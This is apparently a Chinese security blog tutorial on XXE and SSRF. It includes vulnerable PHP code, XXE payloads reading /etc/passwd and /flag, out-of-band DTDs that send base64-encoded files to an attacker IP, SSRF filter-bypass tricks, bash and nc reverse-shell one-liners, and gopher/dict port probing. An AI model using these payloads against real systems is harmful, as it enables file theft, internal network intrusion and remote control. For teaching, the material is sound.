---
title: XXE与SSRF
tags:
  - XXE
  - SSRF
  - 漏洞原理
  - PHP
categories:
  - - 安全技术
  - - 漏洞原理
description: 本文介绍了XXE以及SSRF漏洞的基本原理
abbrlink: 4e6e7714
date: 2025-04-10 20:56:11
---


# XXE and SSRF

# XXE

## XXE - 外部实体注入漏洞

利用了网站在解析xml文件的时候，可以引入外部实体的特性，而外部实体可以使用各种协议如，php://filter ftp http file，等方式获得本地的，网络的资源，从而使我们上传的恶意dtd文件中的payload得以执行。

### 漏洞代码

```php
<?php    libxml_disable_entity_loader(false);    $xmlfile=file_get_contents("php://input");    $dom = new DOMDocument();    $dom -> loadXML($xmlfile,LIBXML_BIGLINES | LIBXML_NOWARNING | LIBXML_NOENT | LIBXML_DTDLOAD);    $creds = simplexml_import_dom($dom);    echo $creds  #注释这一行的话就是没有回显的xxe?>
```

### 有回显的XXE

**判断方式**

修改网页的请求方式为post，post的数据修改为任意xml标签，如：ggggg,如果ggggg成功再页面中显示出来，则存在有回显的XXE漏洞。

**利用**

此时只需直接构造如下payload上传即可

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [<!ENTITY test SYSTEM "file:///etc/password">]><data>&data;</data>//如此便可获取linux系统的密码文件中的内容
```

### 无回显的XXE

即blind oob XXE ——-oob out of band 带外通信

### 利用

**可以访问外网服务器的DTD**

构造上传的xml文件

```
<?xml version="1.0" encoding="UTF-8" ?><!DOCTYPE data SYSTEM "http://192.168.0.104/ .dtd"><data>&send;</data>
```

构造外带的dtd文件

```
<!ENTITY % win SYSTEM "php://filter/read=convert.base64-encode/resource=file:///C://Windows//system.ini"><!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://192.168.248.171:1337/?%win;'>">%wrapper;
```

上述代码用到了php为协议讲需要外带的数据进行base64编码，以避免一些敏感字符引起的错误。

为什么需要使用外带dtd实体

因为内部实体中使不允许使用参数实体的，但在外带实体中则不受此限制

为什么需要使用实体嵌套

因为同级的参数实体不能互相解析，嵌套的第二层需要对%进行转义成为&#x25，不然可能出现问题，三层嵌套则需对& % “ ’等进行转义。在实体的申明中不能引用参数实体，这一w3c标准被xml解析器的支持不是很好，如果使二层嵌套，大部分xml解析器都能成功识别，但如果在三层前逃离里面使用了引用了参数实体，那么很多xml解析器就不能成功地识别，于是乎，我们就可以不使用外带dtd来进行注入，而只需使用内部dtd即可。

`参数实体只能在DTD中使用，普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。`

在内部DTD集中，参数实体的引用不能存在于标记的声明中。这并不适用于外部的参数实体中。

**不可以访问外网服务器DTD**

如果安全过滤较为严格，当前解析器被禁止了访问外网服务器的DTD，那么我们可以利用本地服务器中默认存在的DTD文件，通过重写其中的实体来构造我们需要的实体。

再unbantu中就存在这么一个文件：/usr/share/yelp/dtd/docbookx.dtd

```
<?xml version="1.0"?><!DOCTYPE message [    <!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">    <!ENTITY % ISOamso ' //此为预置的实体        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;http://myip/?&#x25;file;&#x27;>">        &#x25;eval;        &#x25;send;    '>    %remote;]><message>1234</message>
```

## 基于报错的BLIND XXE

基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。 **`类似于sqli中的报错注入`**

**引入网络文件**

xml

```
<?xml version="1.0"?><!DOCTYPE message [    <!ENTITY % remote SYSTEM "http://blog.szfszf.top/xml.dtd">    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">    %remote;    %send;]><message>1234</message>
```

dtd文件

```
<!ENTITY % start "<!ENTITY &#x25; send SYSTEM 'file:///hhhhhhh/%file;'>">%start;   ///hhhhh这个目录不存在，于是会报错，讲%file的内容回显到浏览器。
```

引用本地文件

```
<?xml version="1.0"?><!DOCTYPE message [    <!ENTITY % remote SYSTEM "/usr/share/yelp/dtd/docbookx.dtd">    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">    <!ENTITY % ISOamso '        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; send SYSTEM &#x27;file://hhhhhhhh/?&#x25;file;&#x27;>">        &#x25;eval;        &#x25;send;    '>    %remote;]><message>1234</message>
```

# SSRF

ssrf-服务端请求伪造 sever-side request forgery

成因：服务端提供了从其他服务器获取数据的功能，但没有对目标地址做合理的限制与过滤，使得我们可以利用其来探测内网状态，获取内网资源，读取本地文件，测试内网或者本地的应用程序。

## 漏洞代码

```
<?php    function curl($url){        $ch=curl_init();        curl_setpot($ch,CURLOPT_URL,$url);        curl_setopt($ch,CURLOPT_HEADER,0);        curl_exec($ch);        curl_close($ch);}$url=$_GET["url"]curl($url);?>
```

### 漏洞函数：`file_get_contents\fsockopen\curl_exec`

**file_get_contents**

```
<?phpif (isset($_POST['url'])){$content=file_get_contents($_POST['url']);$filename='./images/'.rand().'img1.jpg';file_put_contents($filename,$content);echo $_POST['url'];$img="<img src=\"".$filename."\"/>";}echo $img?>
```

## 利用

直接更换输入点为我们需要访问地资源地址

## 绕过

1. http://www.baidu.com@www.sina.com
2. 使用十进制ip地址，十六进制IP地址前面加0x，八进制前面加0，
3. 使用ip地址，不适用域名
4. 使用短网址
5. 自己注册一个域名，指向127.0.0.1
6. 使用xip.io http://xx.xx.xx.xx.182.1.3.4.xip.io http://xx.182.1.3.4.xip.io/ ====http://182.1.3.4
7. 加上端口号绕过
8. 加上根域.
9. 使用中文句号替换.
10. 使用enclosed alphanumrics ①②③④⑤⑥⑦⑧⑨⑩⑪⑫⑬⑭⑮⑯⑰⑱⑲⑳⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇⒈⒉⒊⒋⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛⒜⒝⒞⒟⒠⒡⒢⒣⒤⒥⒦⒧⒨⒩⒪⒫⒬⒭⒮⒯⒰⒱⒲⒳⒴⒵ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ⓪⓫⓬⓭⓮⓯⓰⓱⓲⓳⓴⓵⓶⓷⓸⓹⓺⓻⓼⓽⓾⓿
11. dns rebinding
    
    [关于DNS-rebinding的总结_灰太的表格的博客-CSDN博客](https://blog.csdn.net/qq_45449318/article/details/112916226)
    
    [DNS Rebinding 域名重新绑定攻击技术 - FreeBuf网络安全行业门户](https://www.freebuf.com/column/194861.html)
    
    1. **dns重绑定技术，有三种利用姿势，**
        1. 利用ttl值，设置ttl值为0，每次访问同一域名都要进行一次域名解析，第一次解析出来一个外网地址，第二次解析出来内网地址。手动修改两次解析的结果。使两次访问不同的ip但域名还是一样的。国内的ttl值不能设置为0，需使用国外的。
        2. 域名绑定两个ip，能不能成功全靠运气。
    
    ![](https://www.notion.so/XXE%20and%20SSRF%20b66bc33c063d492e8b83706ebb9e8b66/Untitled.png)
    
    XXE%20and%20SSRF%20b66bc33c063d492e8b83706ebb9e8b66/Untitled.png
    
    3，自建一台dns服务器，解析结果全由自己控制。
    

![](https://www.notion.so/XXE%20and%20SSRF%20b66bc33c063d492e8b83706ebb9e8b66/Untitled%201.png)

XXE%20and%20SSRF%20b66bc33c063d492e8b83706ebb9e8b66/Untitled%201.png

### 反弹shell

**使用bash**

> 被攻击者执行命令：bash -i >& /dev/tcp/127.0.0.1/5555 0>&1
> 

> 攻击者监听本机的5555端口：nc -lvp 5555
> 

**使用nc**

正向nc

> nc -lvp 7777 -e /bin/bash //将cmd映射到本地的7777端口
> 

> nc 172.16.11.6 7777//主动去连
> 

方向nc

> nc -e /bin/bash 172.16.11.6 7777 //将cmd.exe发送到控制端主机的7777端口
> 

> nc -lvp 7777 //监听7777端口
> 

### 内网端口探测

`http://172.16.11.6/ssrf.php?url=dict://172.16.11.41:3306/info` info为固定写法

`http://172.16.11.6/ssrf.php?url=gopher://172.16.11.41:3306/_info` gopher协议